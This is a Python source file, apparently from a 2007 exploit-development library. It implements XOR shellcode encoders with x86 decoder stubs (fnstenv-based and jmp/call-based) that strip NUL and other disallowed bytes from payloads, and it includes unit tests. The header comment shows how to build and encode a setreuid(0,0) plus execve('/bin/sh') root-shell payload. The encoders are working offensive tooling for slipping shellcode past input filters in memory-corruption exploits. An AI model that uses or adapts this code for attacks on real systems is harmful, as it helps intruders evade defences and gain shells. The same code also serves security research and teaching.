# Shellcode encoder to avoid NUL or special characters
#
# egg = inlineegg.InlineEgg(inlineegg.Linuxx86Syscall)
# egg.setreuid(0, 0)
# egg.execve('/bin/sh', ('/bin/sh', '-i'))
# shellcode = egg.getCode()
# encoder = FnstenvXorEncoder()
# bytes = encoder.encode(shellcode)
# shellcode = ''.join(chr(x) for x in bytes)
#
# if encode() raises EncoderError, if may be due to your shellcode's length is
# divisible by 256. Putting in a NOP and try again.
#
# Copyright 2007 Nam T. Nguyen, distributed under the BSD license

import types
import unittest

class EncoderError(Exception):
    pass

class Encoder(object):

    def encode(self, payload):
        return payload

class XorEncoder(Encoder):

    def __init__(self, disallowed_chars=(0x00, 0x0D, 0x0A)):
        self._disallowed_chars = set(disallowed_chars)
        self._usable_chars = set(range(256)) - self._disallowed_chars

    def _get_supported_register_sets(self):
        return []

    def _get_register_set(self, register_set):
        return {}

    def _get_header(self):
        return []

    def _get_payload_size_position(self):
        raise NotImplementedError()

    def _get_xor_key_position(self):
        raise NotImplementedError()

    def _encode_payload(self, payload, register_sets):
        buffer = []
        if isinstance(payload, types.StringTypes):
            buffer.extend(ord(x) & 0xFF for x in payload)
        else:
            buffer.extend(payload)

        for c in self._usable_chars:
            ret = buffer[:]
            for i in range(len(ret)):
                ret[i] = ret[i] ^ c
                if ret[i] in self._disallowed_chars:
                    # break inner for
                    break
            else:
                self._xor_key = c
                # break outer for
                break
        else:
            raise EncoderError('cannot encode')

        return ret

    def _prefix_header(self, payload, register_sets):
        ret = self._get_header()

        payload_len = 0x10000 - len(payload)
        payload_size_pos = self._get_payload_size_position()
        ret[payload_size_pos] = payload_len & 0xFF
        ret[payload_size_pos + 1] = (
            (payload_len & 0xFF00) >> 8)

        xor_key_pos = self._get_xor_key_position()
        for reg_set in register_sets:
            for pos, value in self._get_register_set(reg_set).iteritems():
                ret[pos] = value
            for i, c in enumerate(ret):
                if (c in self._disallowed_chars) and (
                    i != xor_key_pos):
                    # break the inner for
                    break
            else:
                # break the outter for
                break
        else:
            raise EncoderError('cannot encode')

        ret[xor_key_pos] = self._xor_key
        ret.extend(payload)

        return ret

    def encode(self, payload, register_sets=[]):
        """Encode payload.

        :param payload: the payload, either a string or a sequence of bytes
        :param register_sets: a sequence of registers to try in shellcode
        header. Sample names include 'eax', 'edx', and 'ebx'.
        :return: a sequence of encoded bytes
        """
        if len(payload) == 0:
            return []

        if len(payload) > 65535:
            raise EncoderError('cannot encode')

        if not self._usable_chars:
            raise EncoderError('cannot encode')

        if not register_sets:
            register_sets = self._get_supported_register_sets()

        encoded_payload = self._encode_payload(payload, register_sets)
        ret = self._prefix_header(encoded_payload, register_sets)

        return ret

    def encode_to_string(self, payload, register_sets=[]):
        """Encode payload. Return a string.

        :see: encode
        """
        return ''.join(chr(x) for x in self.encode(payload, register_sets))

class FnstenvXorEncoder(XorEncoder):
    """Fnstenv Xor based on
    http://www.metasploit.com/sc/x86_fnstenv_xor_byte.asm."""
    HEADER = [
        0xD9, 0xE1,                    # fabs
        0xD9, 0x34, 0x24,              # fnstenv [esp]
        0x5A,                          # pop edx
        0x5A,                          # pop edx
        0x5A,                          # pop edx
        0x5A,                          # pop edx
        0x80, 0xEA, 0xE7,              # sub dl,-25     (offset to payload)
        0x31, 0xC9,                    # xor ecx,ecx
        0x66, 0x81, 0xE9, 0xA1, 0xFE,  # sub cx,-0x15F  (0x15F is size of payload)
        0x80, 0x32, 0x99,              # decode: xor byte [edx],0x99
        0x42,                          # inc edx
        0xE2, 0xFA,                    # loop decode
        # payload goes here
    ]

    REGISTER_SET = {
        'edx' : {5: 0x5A, 6: 0x5A, 7: 0x5A, 8: 0x5A, 9: 0x80, 10: 0xEA,
                 20: 0x32, 22: 0x42},
        'eax' : {5: 0x58, 6: 0x58, 7: 0x58, 8: 0x58, # 9: 0x90, 10: 0x2C,
                 9: 0x80, 10: 0xE8,
                 20: 0x30, 22: 0x40},
        'ebx' : {5: 0x5B, 6: 0x5B, 7: 0x5B, 8: 0x5B, 9: 0x80, 10: 0xEB,
                 20: 0x33, 22: 0x43},
    }

    XOR_KEY_POSITION = 21

    PAYLOAD_SIZE_POSITION = 17         # 17 and 18

    def _get_supported_register_sets(self):
        return FnstenvXorEncoder.REGISTER_SET.keys()

    def _get_register_set(self, register_set):
        return FnstenvXorEncoder.REGISTER_SET[register_set]

    def _get_header(self):
        return FnstenvXorEncoder.HEADER[:]

    def _get_payload_size_position(self):
        return FnstenvXorEncoder.PAYLOAD_SIZE_POSITION

    def _get_xor_key_position(self):
        return FnstenvXorEncoder.XOR_KEY_POSITION

class JumpCallXorEncoder(XorEncoder):
    HEADER = [
        0xeb, 0x10,                    # jmp getdata
        0x5b,                          # begin: pop ebx
        0x31, 0xc9,                    # xor ecx, ecx
        0x66, 0x81, 0xe9, 0xa1, 0xfe,  # sub cx, -0x15F
        0x80, 0x33, 0x99,              # decode: xor byte[ebx], 0x99
        0x43,                          # inc ebx
        0xe2, 0xfa,                    # loop decode
        0xeb, 0x05,                    # jmp payload
        0xe8, 0xeb, 0xff, 0xff, 0xff,  # getdata: call begin
        # payload goes here            # payload:
    ]

    REGISTER_SET = {
        'eax': {2: 0x58, 11: 0x30, 13: 0x40},
        'ebx': {2: 0x5b, 11: 0x33, 13: 0x43},
        'edx': {2: 0x5a, 11: 0x32, 13: 0x42},
    }

    XOR_KEY_POSITION = 12

    PAYLOAD_SIZE_POSITION = 8

    def _get_header(self):
        return JumpCallXorEncoder.HEADER[:]

    def _get_supported_register_sets(self):
        return JumpCallXorEncoder.REGISTER_SET.keys()

    def _get_register_set(self, register_set):
        return JumpCallXorEncoder.REGISTER_SET[register_set]

    def _get_payload_size_position(self):
        return JumpCallXorEncoder.PAYLOAD_SIZE_POSITION

    def _get_xor_key_position(self):
        return JumpCallXorEncoder.XOR_KEY_POSITION

class TestFnstenvXorEncoder(unittest.TestCase):

    def testEmptyShellcode(self):
        encoder = FnstenvXorEncoder()
        self.assertEqual([], encoder.encode(""))

    def testRegisterSet(self):
        encoder = FnstenvXorEncoder()
        ret = encoder.encode("\x00", ['edx'])
        self.assertEqual(ret, [0xd9, 0xe1, 0xd9, 0x34, 0x24, 0x5a, 0x5a, 0x5a,
                               0x5a, 0x80, 0xea, 0xe7, 0x31, 0xc9, 0x66, 0x81,
                               0xe9, 0xFF, 0xFF, 0x80, 0x32, 0x01, 0x42, 0xe2,
                               0xfa, 0x01])
        ret = encoder.encode("\x00", ['eax'])
        self.assertEqual(ret, [0xd9, 0xe1, 0xd9, 0x34, 0x24, 0x58, 0x58, 0x58,
                               0x58, 0x80, 0xe8, 0xe7, 0x31, 0xc9, 0x66, 0x81,
                               0xe9, 0xFF, 0xFF, 0x80, 0x30, 0x01, 0x40, 0xe2,
                               0xfa, 0x01])
        ret = encoder.encode("\x00", ['ebx'])
        self.assertEqual(ret, [0xd9, 0xe1, 0xd9, 0x34, 0x24, 0x5b, 0x5b, 0x5b,
                               0x5b, 0x80, 0xeb, 0xe7, 0x31, 0xc9, 0x66, 0x81,
                               0xe9, 0xFF, 0xFF, 0x80, 0x33, 0x01, 0x43, 0xe2,
                               0xfa, 0x01])
        self.assertRaises(KeyError, encoder.encode, "\x00", ['regset'])

    def testDisallowedCharsInHeader(self):
        encoder = FnstenvXorEncoder(range(256))
        self.assertRaises(EncoderError, encoder.encode, "\x7F")
        encoder = FnstenvXorEncoder([0xE1])
        self.assertRaises(EncoderError, encoder.encode, "\x00")
        encoder = FnstenvXorEncoder([0x00, 0x01, 0x02])
        ret = encoder.encode("\x00", ['edx'])
        self.assertEqual(ret, [0xd9, 0xe1, 0xd9, 0x34, 0x24, 0x5a, 0x5a, 0x5a,
                               0x5a, 0x80, 0xea, 0xe7, 0x31, 0xc9, 0x66, 0x81,
                               0xe9, 0xFF, 0xFF, 0x80, 0x32, 0x03, 0x42, 0xe2,
                               0xfa, 0x03])

    def testDisallowedCharsInPayload(self):
        encoder = FnstenvXorEncoder([0x00, 0x01, 0x02])
        ret = encoder.encode("\x03", ['edx'])
        self.assertEqual(ret, [0xd9, 0xe1, 0xd9, 0x34, 0x24, 0x5a, 0x5a, 0x5a,
                               0x5a, 0x80, 0xea, 0xe7, 0x31, 0xc9, 0x66, 0x81,
                               0xe9, 0xFF, 0xFF, 0x80, 0x32, 0x04, 0x42, 0xe2,
                               0xfa, 0x07])
        encoder = FnstenvXorEncoder([0x00, 0x01, 0x02, 0x04])
        ret = encoder.encode("\x03", ['edx'])
        self.assertEqual(ret, [0xd9, 0xe1, 0xd9, 0x34, 0x24, 0x5a, 0x5a, 0x5a,
                               0x5a, 0x80, 0xea, 0xe7, 0x31, 0xc9, 0x66, 0x81,
                               0xe9, 0xFF, 0xFF, 0x80, 0x32, 0x05, 0x42, 0xe2,
                               0xfa, 0x06])

if __name__ == "__main__":
    unittest.main()

